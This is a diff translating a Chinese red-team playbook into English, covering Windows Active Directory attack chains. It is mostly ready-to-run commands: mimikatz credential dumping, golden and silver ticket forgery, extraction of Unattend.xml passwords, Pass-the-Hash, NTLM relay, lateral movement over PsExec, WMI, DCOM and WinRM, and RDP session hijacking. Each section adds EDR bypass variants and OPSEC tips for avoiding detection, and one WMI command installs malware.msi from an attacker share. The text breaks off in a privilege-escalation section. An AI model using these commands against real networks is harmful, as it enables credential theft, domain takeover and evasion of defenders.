+**2. Obtain the domain SID**  _[windows]_
+_Obtain the domain SID_
 ```
 whoami /user
-或: wmic useraccount get sid
+Or: wmic useraccount get sid
 ```
 
-**3. 生成黄金票据**  _[windows]_
-_生成并注入黄金票据_
+**3. Forge the golden ticket**  _[windows]_
+_Forge and inject the golden ticket_
 ```
 mimikatz # kerberos::golden /user:Administrator /domain:domain.com /sid:S-1-5-21-xxx /krbtgt:HASH /ptt
 ```
 
-**4. 验证票据**  _[windows]_
-_验证黄金票据是否有效_
+**4. Verify the ticket**  _[windows]_
+_Verify that the golden ticket is valid_
 ```
 klist
-或: dir \\dc.domain.com\c$
+Or: dir \\dc.domain.com\c$
 ```
 
 ---
 
-### 白银票据攻击  `silver-ticket`
-使用服务账户哈希生成白银票据
-子类：**域持久化** · tags: `silver-ticket` `kerberos` `service`
+### Silver ticket attack  `silver-ticket`
+Forge a silver ticket using a service account hash
+Subcategory: **Domain persistence** · tags: `silver-ticket` `kerberos` `service`
 
-**前置条件：** 服务账户哈希；域SID
+**Preconditions:** a service account hash; the domain SID
 
-**攻击链：**
+**Attack chain:**
 
-**1. 获取服务哈希**  _[windows]_
-_获取服务账户哈希_
+**1. Obtain the service hash**  _[windows]_
+_Obtain the service account hash_
 ```
 mimikatz # sekurlsa::logonpasswords
-寻找服务账户NTLM哈希
+Locate the service account's NTLM hash
 ```
 
-**2. 生成白银票据**  _[windows]_
-_生成针对特定服务的票据_
+**2. Forge the silver ticket**  _[windows]_
+_Forge a ticket for a specific service_
 ```
 mimikatz # kerberos::golden /user:Administrator /domain:domain.com /sid:S-1-5-21-xxx /target:server.domain.com /service:cifs /rc4:HASH /ptt
 ```
 
-**3. 常见服务类型**
-_可伪造的服务类型_
+**3. Common service types**
+_Service types that can be forged_
 ```
-CIFS - 文件共享
-HTTP - Web服务
-LDAP - 目录服务
-MSSQLSvc - SQL服务
-HOST - 远程管理
+CIFS - file sharing
+HTTP - web services
+LDAP - directory services
+MSSQLSvc - SQL services
+HOST - remote management
 ```
 
 ---
 
-### 无人值守安装凭证提取  `unattended-creds`
-从Windows无人值守安装文件(Unattend.xml/Sysprep)中提取明文或Base64编码的管理员凭证
-子类：**文件凭证** · tags: `credentials` `unattend` `sysprep` `privilege-escalation` `windows`
+### Unattended-install credential extraction  `unattended-creds`
+Extract cleartext or Base64-encoded administrator credentials from Windows unattended-install files (Unattend.xml / Sysprep)
+Subcategory: **File credentials** · tags: `credentials` `unattend` `sysprep` `privilege-escalation` `windows`
 
-**前置条件：** 本地文件系统读取权限；目标使用过无人值守部署
+**Preconditions:** read access to the local filesystem; the target has used unattended deployment
 
-**攻击链：**
+**Attack chain:**
 
-**1. 搜索无人值守安装文件**  _[windows]_
-_在默认路径搜索Unattend/Sysprep配置文件，这些文件在Windows自动部署后可能残留在系统中_
+**1. Search for unattended-install files**  _[windows]_
+_Search the default paths for Unattend/Sysprep files, which may linger on the system after automated Windows deployment_
 ```
 dir /s /b C:\Windows\Panther\Unattend.xml C:\Windows\Panther\unattended.xml C:\Windows\Panther\Autounattend.xml C:\Windows\System32\Sysprep\sysprep.xml C:\Windows\System32\Sysprep\unattend.xml 2>nul
 ```
 
-**2. 全盘搜索Unattend文件**  _[windows]_
-_当默认路径找不到时，全盘递归搜索所有可能的无人值守文件_
+**2. Search the whole disk for Unattend files**  _[windows]_
+_When the default paths turn up nothing, recursively search the whole disk for any possible unattended files_
 ```
-# CMD方式
+# CMD approach
 dir /s /b C:\*unattend*.xml C:\*sysprep*.xml 2>nul
 
-# PowerShell方式
+# PowerShell approach
 Get-ChildItem -Path C:\ -Recurse -Include "*unattend*","*sysprep*","*autounattend*" -ErrorAction SilentlyContinue | Select-Object FullName
 ```
 
-**3. 提取明文密码**  _[windows]_
-_从Unattend.xml中提取密码字段，密码可能以明文或Base64编码形式存储在<Password>/<AdminPassword>/<AutoLogon>节点中_
+**3. Extract cleartext passwords**  _[windows]_
+_Extract the password fields from Unattend.xml; passwords may be stored as cleartext or Base64 in the <Password>/<AdminPassword>/<AutoLogon> nodes_
 ```
-# 查看文件内容
+# View the file contents
 type C:\Windows\Panther\Unattend.xml
 
-# 关键字段搜索
+# Search for the key fields
 findstr /i /c:"Password" /c:"AutoLogon" /c:"AdminPassword" C:\Windows\Panther\Unattend.xml
 
-# PowerShell提取
+# PowerShell extraction
 [xml]$xml = Get-Content C:\Windows\Panther\Unattend.xml
 $xml.unattend.settings.component | Where-Object { $_.AutoLogon } | ForEach-Object { $_.AutoLogon.Password.Value }
 ```
 
-**4. 解码Base64密码**  _[windows]_
-_Unattend.xml中的密码如果以Base64编码存储，需要解码。Windows使用UTF-16LE编码，因此必须用Unicode解码而非ASCII_
+**4. Decode Base64 passwords**  _[windows]_
+_If the Unattend.xml password is stored as Base64 it must be decoded. Windows uses UTF-16LE, so decode as Unicode rather than ASCII_
 ```
-# PowerShell解码Base64
-$encoded = "QQBkAG0AaQBuAEAAMQAyADMA"  # 从XML提取的编码值
+# Decode Base64 in PowerShell
+$encoded = "QQBkAG0AaQBuAEAAMQAyADMA"  # the encoded value extracted from the XML
 [System.Text.Encoding]::Unicode.GetString([System.Convert]::FromBase64String($encoded))
 
-# 或者使用certutil
+# Or use certutil
 echo QQBkAG0AaQBuAEAAMQAyADMA > C:\temp\encoded.txt
 certutil -decode C:\temp\encoded.txt C:\temp\decoded.txt
 type C:\temp\decoded.txt
 ```
 
-**5. 检查其他敏感安装文件**  _[windows]_
-_除Unattend.xml外，其他位置也可能存储明文凭证_
+**5. Check other sensitive install files**  _[windows]_
+_Beyond Unattend.xml, other locations may also hold cleartext credentials_
 ```
-# 检查GPP(Group Policy Preferences)密码
+# Check GPP (Group Policy Preferences) passwords
 findstr /S /I cpassword \\domain.com\sysvol\domain.com\policies\*.xml 2>nul
 
-# 检查IIS配置文件
+# Check IIS configuration files
 type C:\inetpub\wwwroot\web.config 2>nul | findstr /i "connectionString password"
 
-# 检查VNC密码文件
+# Check VNC password files
 reg query "HKCU\Software\ORL\WinVNC3\Password" 2>nul
 reg query "HKLM\SOFTWARE\RealVNC\WinVNC4" /v Password 2>nul
 
-# 检查WiFi密码
+# Check WiFi passwords
 netsh wlan show profiles
-netsh wlan show profile name="目标WiFi" key=clear
+netsh wlan show profile name="target-WiFi" key=clear
 ```
 
-**6. 使用Metasploit自动化**  _[windows]_
-_使用Metasploit后渗透模块自动搜索和提取无人值守安装文件中的凭证_
+**6. Automate with Metasploit**  _[windows]_
+_Use Metasploit post-exploitation modules to automatically find and extract credentials from unattended-install files_
 ```
-# Metasploit模块
+# Metasploit module
 use post/windows/gather/enum_unattend
 set SESSION 1
 run
 
-# 也可以使用
+# You can also use
 use post/multi/gather/firefox_creds
 use post/windows/gather/credentials/gpp
 use post/windows/gather/cachedump
 ```
 
-**EDR 绕过变体：**
+**EDR bypass variants:**
 
-**1. 绕过文件访问监控**  _[windows]_
-_通过卷影副本或流式读取绕过文件访问监控_
+**1. Bypass file-access monitoring**  _[windows]_
+_Bypass file-access monitoring via volume shadow copies or streamed reads_
 ```
-# 使用Volume Shadow Copy读取被锁定的文件
+# Use a Volume Shadow Copy to read locked files
 vssadmin create shadow /for=C:
 copy \\?\GLOBALROOT\Device\HarddiskVolumeShadowCopy1\Windows\Panther\Unattend.xml C:\temp\u.xml
 
-# 使用PowerShell流式读取避免文件锁
+# Use streamed PowerShell reads to avoid file locks
 [IO.File]::ReadAllText("C:\Windows\Panther\Unattend.xml")
 ```
 
-**分析：** 无人值守安装文件是Windows大规模部署的产物。这些XML文件中的<UserAccounts>/<AutoLogon>节点可能包含本地管理员或域管理员的明文/编码凭证。该漏洞在企业环境中极为常见，因为IT部门经常忽略部署后清理这些文件。
+**Analysis:** unattended-install files are a byproduct of large-scale Windows deployment. The <UserAccounts>/<AutoLogon> nodes in these XML files may hold cleartext or encoded credentials for a local or domain administrator. The issue is extremely common in enterprise environments because IT often forgets to clean these files up after deployment.
 
-**OPSEC：** 读取文件操作通常不会触发警报，但大量文件搜索(dir /s)可能被EDR检测。建议直接检查已知路径而非全盘搜索。
+**OPSEC:** reading files rarely raises alerts, but bulk file searches (dir /s) may be caught by EDR. Prefer checking known paths directly over a whole-disk search.
 
 ---
 
-## 横向移动
+## Lateral movement
 
-### PsExec横向移动  `lateral-psexec`
-使用PsExec进行横向移动
-子类：**SMB** · tags: `psexec` `lateral` `smb` `windows`
+### PsExec lateral movement  `lateral-psexec`
+Use PsExec for lateral movement
+Subcategory: **SMB** · tags: `psexec` `lateral` `smb` `windows`
 
-**前置条件：** 目标机器开放445端口；拥有目标机器管理员凭证；ADMIN$共享可访问
+**Preconditions:** the target has port 445 open; you hold administrator credentials for it; the ADMIN$ share is reachable
 
-**攻击链：**
+**Attack chain:**
 
-**1. 基本使用**  _[linux]_
-_使用Impacket的psexec.py连接目标_
+**1. Basic usage**  _[linux]_
+_Connect to the target with Impacket's psexec.py_
 ```
 psexec.py domain/user:password@target_ip
 ```
 
-**2. 使用哈希连接**  _[linux]_
-_使用NTLM哈希进行Pass-the-Hash_
+**2. Connect with a hash**  _[linux]_
+_Pass-the-Hash with an NTLM hash_
 ```
 psexec.py -hashes :NTLM_HASH domain/user@target_ip
 ```
 
-**3. 执行命令**  _[linux]_
-_在目标机器执行命令_
+**3. Run a command**  _[linux]_
+_Run a command on the target machine_
 ```
 psexec.py domain/user:password@target_ip "whoami"
 ```
 
 **4. Windows PsExec**  _[windows]_
-_使用Sysinternals PsExec_
+_Use Sysinternals PsExec_
 ```
 PsExec.exe \\target_ip -u domain\user -p password cmd.exe
 ```
 
-**EDR 绕过变体：**
+**EDR bypass variants:**
 
-**1. 自定义服务名**
-_使用自定义服务名避免检测_
+**1. Custom service name**
+_Use a custom service name to avoid detection_
 ```
 psexec.py -service-name CustomService domain/user:password@target_ip
 ```
 
-**2. SMBExec替代**
-_使用smbexec.py，不写入磁盘_
+**2. SMBExec alternative**
+_Use smbexec.py, which writes nothing to disk_
 ```
 smbexec.py domain/user:password@target_ip
 ```
 
-**分析：** PsExec通过SMB协议在目标机器创建服务并执行命令，成功后可获得目标机器的Shell。
+**Analysis:** PsExec creates a service on the target over SMB and runs a command; on success you get a shell on the target.
 
-**OPSEC：** PsExec会在目标机器创建服务，容易被检测；服务名称和二进制文件可能触发告警；考虑使用更隐蔽的横向移动方式
+**OPSEC:** PsExec creates a service on the target and is easily detected; the service name and binary may trigger alerts; consider stealthier lateral-movement methods
 
 ---
 
-### WMI横向移动  `lateral-wmi`
-使用WMI进行横向移动
-子类：**WMI** · tags: `wmi` `lateral` `windows` `remote`
+### WMI lateral movement  `lateral-wmi`
+Use WMI for lateral movement
+Subcategory: **WMI** · tags: `wmi` `lateral` `windows` `remote`
 
-**前置条件：** 目标机器开放135端口；拥有目标机器管理员凭证；WMI服务可访问
+**Preconditions:** the target has port 135 open; you hold administrator credentials for it; the WMI service is reachable
 
-**攻击链：**
+**Attack chain:**
 
-**1. WMI执行命令**  _[windows]_
-_使用WMIC远程执行命令_
+**1. Run a command via WMI**  _[windows]_
+_Run a command remotely with WMIC_
 ```
 wmic /node:target_ip /user:domain\user /password:pass process call create "cmd.exe /c whoami"
 ```
 
 **2. Impacket wmiexec**  _[linux]_
-_使用Impacket的wmiexec.py_
+_Use Impacket's wmiexec.py_
 ```
 wmiexec.py domain/user:password@target_ip
 ```
 
-**3. 使用哈希**  _[linux]_
-_Pass-the-Hash通过WMI_
+**3. Using a hash**  _[linux]_
+_Pass-the-Hash over WMI_
 ```
 wmiexec.py -hashes :NTLM_HASH domain/user@target_ip
 ```
 
 **4. PowerShell WMI**  _[windows]_
-_使用PowerShell WMI_
+_Use PowerShell WMI_
 ```
 Invoke-WmiMethod -Class Win32_Process -Name Create -ArgumentList "cmd.exe /c whoami" -ComputerName target_ip -Credential $cred
 ```
 
-**EDR 绕过变体：**
+**EDR bypass variants:**
 
-**1. WMI事件订阅**
-_通过WMI安装MSI包执行代码_
+**1. WMI event subscription**
+_Execute code by installing an MSI package via WMI_
 ```
 wmic /node:target_ip /user:domain\user /password:pass path win32_product call install /package:"\\attacker\share\malware.msi"
 ```
 
-**分析：** WMI横向移动不会在目标机器创建服务，相对PsExec更隐蔽。
+**Analysis:** WMI lateral movement creates no service on the target, making it stealthier than PsExec.
 
-**OPSEC：** WMI执行不会留下明显的文件痕迹；但WMI活动可能被监控；命令输出通过临时文件获取
+**OPSEC:** WMI execution leaves no obvious file artifacts, but WMI activity may be monitored; command output is retrieved through a temporary file
 
 ---
 
-### Pass-the-Hash攻击  `pass-the-hash`
-使用NTLM哈希进行身份验证
-子类：**认证攻击** · tags: `pth` `ntlm` `hash` `authentication`
+### Pass-the-Hash attack  `pass-the-hash`
+Authenticate using an NTLM hash
+Subcategory: **Authentication attacks** · tags: `pth` `ntlm` `hash` `authentication`
 
-**前置条件：** 获取用户NTLM哈希；目标机器允许NTLM认证；目标机器开放SMB/WMI端口
+**Preconditions:** you have the user's NTLM hash; the target allows NTLM authentication; the target has SMB/WMI ports open
 
-**攻击链：**
+**Attack chain:**
 
 **1. Impacket PtH**  _[linux]_
-_使用Impacket进行PtH_
+_Perform PtH with Impacket_
 ```
 psexec.py -hashes :NTHASH domain/user@target_ip
 ```
 
 **2. CrackMapExec PtH**  _[linux]_
-_使用CrackMapExec进行PtH_
+_Perform PtH with CrackMapExec_
 ```
 crackmapexec smb target_ip -u user -H NTHASH -d domain
 ```
 
 **3. Windows PtH**  _[windows]_
-_使用Mimikatz进行PtH_
+_Perform PtH with Mimikatz_
 ```
 sekurlsa::pth /user:Administrator /domain:target.com /ntlm:NTHASH
 ```
 
 **4. PowerShell PtH**  _[windows]_
-_使用PowerShell进行PtH_
+_Perform PtH with PowerShell_
 ```
 Invoke-SMBClient -Domain domain -User user -Hash NTHASH -Target target_ip
 ```
 
-**EDR 绕过变体：**
+**EDR bypass variants:**
 
 **1. Overpass-the-Hash**
-_将哈希转换为Kerberos票据_
+_Convert the hash into a Kerberos ticket_
 ```
 sekurlsa::pth /user:Administrator /domain:target.com /ntlm:NTHASH /run:cmd.exe
 ```
 
-**分析：** PtH成功后可以该用户身份访问目标机器，无需明文密码。
+**Analysis:** on success, PtH lets you access the target as that user with no cleartext password.
 
-**OPSEC：** PtH不会产生登录日志中的密码验证；但会留下网络登录日志；注意时间戳和来源IP
+**OPSEC:** PtH produces no password-validation entry in the logon logs, but it does leave network logon logs; watch the timestamps and source IP
 
 ---
 
-### NTLM Relay攻击  `ntlm-relay`
-NTLM中继攻击技术
-子类：**认证攻击** · tags: `ntlm` `relay` `smb` `authentication`
+### NTLM relay attack  `ntlm-relay`
+NTLM relay attack techniques
+Subcategory: **Authentication attacks** · tags: `ntlm` `relay` `smb` `authentication`
 
-**前置条件：** 目标机器开放SMB端口；目标机器未启用SMB签名；可诱导目标机器认证
+**Preconditions:** the target has SMB ports open; SMB signing is not enforced on it; you can coerce it into authenticating
 
-**攻击链：**
+**Attack chain:**
 
-**1. Responder监听**  _[linux]_
-_启动Responder监听NTLM认证_
+**1. Responder listener**  _[linux]_
+_Start Responder to capture NTLM authentication_
 ```
 responder -I eth0 -wrf
 ```
 
-**2. ntlmrelayx攻击**  _[linux]_
-_使用ntlmrelayx进行中继攻击_
+**2. ntlmrelayx attack**  _[linux]_
+_Run a relay attack with ntlmrelayx_
 ```
 ntlmrelayx.py -tf targets.txt -smb2support
 ```
 
-**3. 中继到LDAP**  _[linux]_
-_中继到LDAP进行权限提升_
+**3. Relay to LDAP**  _[linux]_
+_Relay to LDAP for privilege escalation_
 ```
 ntlmrelayx.py -t ldap://dc_ip -smb2support --escalate-user user
 ```
 
-**4. IPv6中继**  _[linux]_
-_使用IPv6进行NTLM中继_
+**4. IPv6 relay**  _[linux]_
+_Perform an NTLM relay over IPv6_
 ```
 mitm6 -d domain.com & ntlmrelayx.py -t ldap://dc_ip -wh attacker_ip
 ```
 
-**EDR 绕过变体：**
+**EDR bypass variants:**
 
 **1. Drop the MIC**
-_移除MIC标志绕过签名验证_
+_Strip the MIC flag to bypass signature verification_
 ```
 ntlmrelayx.py -t smb://target --remove-mic
 ```
 
-**分析：** NTLM Relay成功后可以获取目标机器的访问权限或提升域权限。
+**Analysis:** a successful NTLM relay grants access to the target machine or escalates domain privileges.
 
-**OPSEC：** 需要目标机器未启用SMB签名；域控制器默认启用签名；IPv6中继更隐蔽
+**OPSEC:** the target must not enforce SMB signing; domain controllers enforce it by default; IPv6 relay is stealthier
 
 ---
 
-### WinRM横向移动  `lateral-winrm`
-通过WinRM进行横向移动
-子类：**WinRM** · tags: `winrm` `lateral` `powershell`
+### WinRM lateral movement  `lateral-winrm`
+Move laterally via WinRM
+Subcategory: **WinRM** · tags: `winrm` `lateral` `powershell`
 
-**前置条件：** WinRM启用；有效凭证
+**Preconditions:** WinRM enabled; valid credentials
 
-**攻击链：**
+**Attack chain:**
 
-**1. PowerShell远程**  _[windows]_
-_PowerShell远程会话_
+**1. PowerShell remoting**  _[windows]_
+_PowerShell remote session_
 ```
 Enter-PSSession -ComputerName target -Credential $cred
 ```
 
-**2. 执行命令**  _[windows]_
-_远程执行命令_
+**2. Run a command**  _[windows]_
+_Run a command remotely_
 ```
 Invoke-Command -ComputerName target -ScriptBlock { whoami } -Credential $cred
 ```
 
 **3. evil-winrm**  _[linux]_
-_使用evil-winrm连接_
+_Connect with evil-winrm_
 ```
 evil-winrm -i target -u user -p password
 ```
 
 ---
 
-### DCOM横向移动  `lateral-dcom`
-通过DCOM进行横向移动
-子类：**DCOM** · tags: `dcom` `lateral` `com`
+### DCOM lateral movement  `lateral-dcom`
+Move laterally via DCOM
+Subcategory: **DCOM** · tags: `dcom` `lateral` `com`
 
-**前置条件：** DCOM启用；有效凭证
+**Preconditions:** DCOM enabled; valid credentials
 
-**攻击链：**
+**Attack chain:**
 
 **1. MMC20.Application**  _[windows]_
-_通过MMC DCOM执行命令_
+_Run a command via MMC DCOM_
 ```
 $com = [activator]::CreateInstance([type]::GetTypeFromProgID("MMC20.Application","target"))
 $com.Document.ActiveView.ExecuteShellCommand("cmd",$null,"/c whoami","7")
 ```
 
 **2. ShellBrowserWindow**  _[windows]_
-_通过ShellBrowserWindow执行_
+_Execute via ShellBrowserWindow_
 ```
 $com = [activator]::CreateInstance([type]::GetTypeFromCLSID("9BA05972-F6A8-11CF-A442-00A0C90A8F39","target"))
 $com.Document.Application.ShellExecute("cmd.exe","/c whoami","c:\windows\system32",$null,0)
 ```
 
 **3. Excel DCOM**  _[windows]_
-_通过Excel DCOM执行_
+_Execute via Excel DCOM_
 ```
 $com = [activator]::CreateInstance([type]::GetTypeFromProgID("Excel.Application","target"))
 $com.DisplayAlerts = $false
@@ -1096,56 +1096,56 @@ $com.DDEInitiate("cmd","/c calc.exe")
 
 ---
 
-### SSH横向移动  `lateral-ssh`
-通过SSH进行横向移动
-子类：**SSH** · tags: `ssh` `lateral` `linux`
+### SSH lateral movement  `lateral-ssh`
+Move laterally via SSH
+Subcategory: **SSH** · tags: `ssh` `lateral` `linux`
 
-**前置条件：** SSH服务；有效凭证
+**Preconditions:** an SSH service; valid credentials
 
-**攻击链：**
+**Attack chain:**
 
-**1. SSH连接**  _[linux]_
-_基础SSH连接_
+**1. SSH connection**  _[linux]_
+_Basic SSH connection_
 ```
 ssh user@target
 ```
 
-**2. SSH密钥认证**  _[linux]_
-_使用私钥连接_
+**2. SSH key authentication**  _[linux]_
+_Connect with a private key_
 ```
 ssh -i private_key user@target
 ```
 
-**3. SSH跳板**  _[linux]_
-_通过跳板机连接_
+**3. SSH pivoting**  _[linux]_
+_Connect through a jump host_
 ```
 ssh -J jump_host user@target
 ```
 
 ---
 
-### RDP会话劫持  `rdp-hijack`
-劫持已存在的RDP会话
-子类：**RDP** · tags: `rdp` `hijack` `session`
+### RDP session hijacking  `rdp-hijack`
+Hijack an existing RDP session
+Subcategory: **RDP** · tags: `rdp` `hijack` `session`
 
-**前置条件：** SYSTEM权限；存在RDP会话
+**Preconditions:** SYSTEM privileges; an existing RDP session
 
-**攻击链：**
+**Attack chain:**
 
-**1. 列出会话**  _[windows]_
-_列出所有用户会话_
+**1. List sessions**  _[windows]_
+_List every user session_
 ```
 query user
 ```
 
-**2. 劫持会话**  _[windows]_
-_劫持指定会话_
+**2. Hijack a session**  _[windows]_
+_Hijack a specific session_
 ```
 tscon SESSION_ID /dest:console
 ```
 
-**3. 使用Mimikatz**  _[windows]_
-_使用Mimikatz劫持_
+**3. Using Mimikatz**  _[windows]_
+_Hijack with Mimikatz_
 ```
 ts::sessions
 ts::remote /id:SESSION_ID
@@ -1154,27 +1154,27 @@ ts::remote /id:SESSION_ID
 ---
 
 ### Overpass-the-Hash  `overpass-the-hash`
-使用哈希获取Kerberos票据
-子类：**PtH** · tags: `pth` `kerberos` `hash`
+Obtain a Kerberos ticket using a hash
+Subcategory: **PtH** · tags: `pth` `kerberos` `hash`
 
-**前置条件：** 用户NTLM哈希；域环境
+**Preconditions:** the user's NTLM hash; a domain environment
 
-**攻击链：**
+**Attack chain:**
 
 **1. Mimikatz**  _[windows]_
-_使用哈希获取Kerberos票据_
+_Obtain a Kerberos ticket using a hash_
 ```
 sekurlsa::pth /user:Administrator /domain:domain.com /ntlm:HASH /ptt
 ```
 
 **2. Rubeus**  _[windows]_
-_使用Rubeus获取票据_
+_Obtain a ticket with Rubeus_
 ```
 Rubeus.exe asktgt /user:Administrator /domain:domain.com /rc4:HASH /ptt
 ```
 
 **3. Impacket**  _[linux]_
-_获取Kerberos票据_
+_Obtain a Kerberos ticket_
 ```
 getTGT.py domain.com/user -hashes :HASH
 ```
@@ -1182,49 +1182,49 @@ getTGT.py domain.com/user -hashes :HASH
 ---
 
 ### Pass-the-Ticket  `pass-the-ticket`
-使用Kerberos票据进行横向移动
-子类：**PtT** · tags: `ptt` `kerberos` `ticket`
+Move laterally using a Kerberos ticket
+Subcategory: **PtT** · tags: `ptt` `kerberos` `ticket`
 
-**前置条件：** 有效Kerberos票据
+**Preconditions:** a valid Kerberos ticket
 
-**攻击链：**
+**Attack chain:**
 
-**1. 导出票据**  _[windows]_
-_从内存导出Kerberos票据_
+**1. Export a ticket**  _[windows]_
+_Export a Kerberos ticket from memory_
 ```
 sekurlsa::tickets /export
 ```
 
-**2. 注入票据**  _[windows]_
-_注入票据到当前会话_
+**2. Inject a ticket**  _[windows]_
+_Inject a ticket into the current session_
 ```
 kerberos::ptt ticket.kirbi
 ```
 
-**3. Rubeus导入**  _[windows]_
-_使用Rubeus注入票据_
+**3. Rubeus import**  _[windows]_
+_Inject a ticket with Rubeus_
 ```
 Rubeus.exe ptt /ticket:base64ticket
 ```
 
 ---
 
-### SMBExec横向移动  `lateral-smbexec`
-通过SMB执行命令
-子类：**SMB** · tags: `smb` `lateral` `exec`
+### SMBExec lateral movement  `lateral-smbexec`
+Run commands over SMB
+Subcategory: **SMB** · tags: `smb` `lateral` `exec`
 
-**前置条件：** SMB访问权限；管理员权限
+**Preconditions:** SMB access; administrator privileges
 
-**攻击链：**
+**Attack chain:**
 
 **1. Impacket smbexec**  _[linux]_
-_使用smbexec执行命令_
+_Run a command with smbexec_
 ```
 smbexec.py domain/user:password@target
 ```
 
-**2. 通过服务执行**  _[windows]_
-_创建并启动服务_
+**2. Execute via a service**  _[windows]_
+_Create and start a service_
 ```
 sc \\target create evilsvc binPath= "cmd /c whoami"
 sc \\target start evilsvc
@@ -1233,68 +1233,68 @@ sc \\target delete evilsvc
 
 ---
 
-### ATExec横向移动  `lateral-atexec`
-通过计划任务执行命令
-子类：**计划任务** · tags: `at` `scheduled` `lateral`
+### ATExec lateral movement  `lateral-atexec`
+Run commands via a scheduled task
+Subcategory: **Scheduled tasks** · tags: `at` `scheduled` `lateral`
 
-**前置条件：** 计划任务权限；管理员权限
+**Preconditions:** scheduled-task rights; administrator privileges
 
-**攻击链：**
+**Attack chain:**
 
 **1. Impacket atexec**  _[linux]_
-_使用atexec执行命令_
+_Run a command with atexec_
 ```
 atexec.py domain/user:password@target "whoami"
 ```
 
 **2. schtasks**  _[windows]_
-_创建远程计划任务_
+_Create a remote scheduled task_
 ```
 schtasks /create /s target /tn "evil" /tr "cmd /c whoami" /sc once /st 00:00
 ```
 
 ---
 
-### WinRS横向移动  `lateral-winrs`
-通过WinRS执行远程命令
-子类：**WinRS** · tags: `winrs` `lateral` `windows`
+### WinRS lateral movement  `lateral-winrs`
+Run remote commands via WinRS
+Subcategory: **WinRS** · tags: `winrs` `lateral` `windows`
 
-**前置条件：** WinRM启用；有效凭证
+**Preconditions:** WinRM enabled; valid credentials
 
-**攻击链：**
+**Attack chain:**
 
-**1. 执行命令**  _[windows]_
-_远程执行命令_
+**1. Run a command**  _[windows]_
+_Run a command remotely_
 ```
 winrs -r:target -u:user -p:password "whoami"
 ```
 
-**2. 获取Shell**  _[windows]_
-_获取远程CMD_
+**2. Get a shell**  _[windows]_
+_Get a remote CMD shell_
 ```
 winrs -r:target -u:user -p:password "cmd"
 ```
 
 ---
 
-### Excel DCOM横向移动  `lateral-dcom-excel`
-利用Excel DCOM进行横向移动
-子类：**DCOM** · tags: `dcom` `excel` `lateral`
+### Excel DCOM lateral movement  `lateral-dcom-excel`
+Move laterally by abusing Excel DCOM
+Subcategory: **DCOM** · tags: `dcom` `excel` `lateral`
 
-**前置条件：** 目标安装Excel；DCOM权限
+**Preconditions:** Excel is installed on the target; DCOM rights
 
-**攻击链：**
+**Attack chain:**
 
-**1. Excel DCOM激活**  _[windows]_
-_激活Excel DCOM对象_
+**1. Activate the Excel DCOM object**  _[windows]_
+_Activate the Excel DCOM object_
 ```
 $com = [Type]::GetTypeFromProgID("Excel.Application","target.com")
 $obj = [System.Activator]::CreateInstance($com)
 $obj.Visible = $false
 ```
 
-**2. 执行命令**  _[windows]_
-_通过Excel执行命令_
+**2. Run a command**  _[windows]_
+_Run a command via Excel_
 ```
 $obj.Workbooks.Add()
 $obj.Cells.Item(1,1) = "=CMD|/C calc.exe!A"
@@ -1302,204 +1302,204 @@ $obj.Run("calc.exe")
 ```
 
 **3. Impacket DCOM**  _[linux]_
-_使用Impacket执行_
+_Execute with Impacket_
 ```
 python dcomexec.py -object Excel.Application domain/user:password@target.com
 ```
 
 ---
 
-### MMC DCOM横向移动  `lateral-dcom-mmc`
-利用MMC DCOM进行横向移动
-子类：**DCOM** · tags: `dcom` `mmc` `lateral`
+### MMC DCOM lateral movement  `lateral-dcom-mmc`
+Move laterally by abusing MMC DCOM
+Subcategory: **DCOM** · tags: `dcom` `mmc` `lateral`
 
-**前置条件：** 目标安装MMC；DCOM权限
+**Preconditions:** MMC is installed on the target; DCOM rights
 
-**攻击链：**
+**Attack chain:**
 
 **1. MMC20.Application**  _[windows]_
-_使用MMC执行命令_
+_Run a command via MMC_
 ```
 $com = [Type]::GetTypeFromProgID("MMC20.Application","target.com")
 $obj = [System.Activator]::CreateInstance($com)
 $obj.Document.ActiveView.ExecuteShellCommand("cmd.exe",$null,"/c calc.exe","7")
 ```
 
-**2. Impacket执行**  _[linux]_
-_使用Impacket_
+**2. Impacket execution**  _[linux]_
+_Use Impacket_
 ```
 python dcomexec.py -object MMC20.Application domain/user:password@target.com
 ```
 
 ---
 
-### RDP Relay攻击  `rdp-relay`
-RDP中继攻击技术
-子类：**RDP** · tags: `rdp` `relay` `lateral`
+### RDP relay attack  `rdp-relay`
+RDP relay attack techniques
+Subcategory: **RDP** · tags: `rdp` `relay` `lateral`
 
-**前置条件：** RDP服务可访问；存在NTLM认证
+**Preconditions:** the RDP service is reachable; NTLM authentication is in use
 
-**攻击链：**
+**Attack chain:**
 
-**1. 设置中继**  _[linux]_
-_设置RDP中继服务器_
+**1. Set up the relay**  _[linux]_
+_Set up an RDP relay server_
 ```
-使用Impacket:
+Using Impacket:
 python ntlmrelayx.py -tf targets.txt -smb2support
-或使用rdp_relay.py
+Or use rdp_relay.py
 ```
 
-**2. 诱导连接**
-_诱导用户连接_
+**2. Coerce a connection**
+_Coerce a user into connecting_
 ```
-诱导用户连接到攻击者控制的RDP服务器:
-1. 发送恶意RDP文件
-2. 用户连接时中继到目标
+Coerce a user into connecting to an attacker-controlled RDP server:
+1. Send a malicious RDP file
+2. When the user connects, relay to the target
 ```
 
-**3. PetitPotam组合**  _[linux]_
+**3. PetitPotam combination**  _[linux]_
 _PetitPotam + RDP Relay_
 ```
 python petitpotam.py -d domain -u user -p pass attacker_ip target_ip
-结合NTLM中继攻击ADCS
+Combine with an NTLM relay to attack AD CS
 ```
 
 ---
 
-## 权限提升
+## Privilege escalation
 
-### 令牌窃取与模拟  `privilege-token`
-窃取和模拟Windows访问令牌
-子类：**令牌操作** · tags: `token` `privilege` `impersonation` `windows`
+### Token theft and impersonation  `privilege-token`
+Steal and impersonate Windows access tokens
+Subcategory: **Token manipulation** · tags: `token` `privilege` `impersonation` `windows`
 
-**前置条件：** 已获得目标机器权限；SeImpersonatePrivilege权限；Windows系统
+**Preconditions:** you already have access to the target; SeImpersonatePrivilege; Windows system
 
-**攻击链：**
+**Attack chain:**
 
-**1. 列出令牌**  _[windows]_
-_列出系统中所有可用令牌_
+**1. List tokens**  _[windows]_
+_List every available token on the system_
 ```
 mimikatz.exe "privilege::debug" "token::list" "exit"
 ```
 
-**2. 窃取令牌**  _[windows]_
-_窃取指定用户的令牌_
+**2. Steal a token**  _[windows]_
+_Steal a specific user's token_
 ```
 mimikatz.exe "privilege::debug" "token::elevate /domainuser:Administrator" "exit"
 ```
 
-**3. JuicyPotato攻击**  _[windows]_
-_JuicyPotato提权（需要SeImpersonatePrivilege）_
+**3. JuicyPotato attack**  _[windows]_
+_JuicyPotato privilege escalation (requires SeImpersonatePrivilege)_
 ```
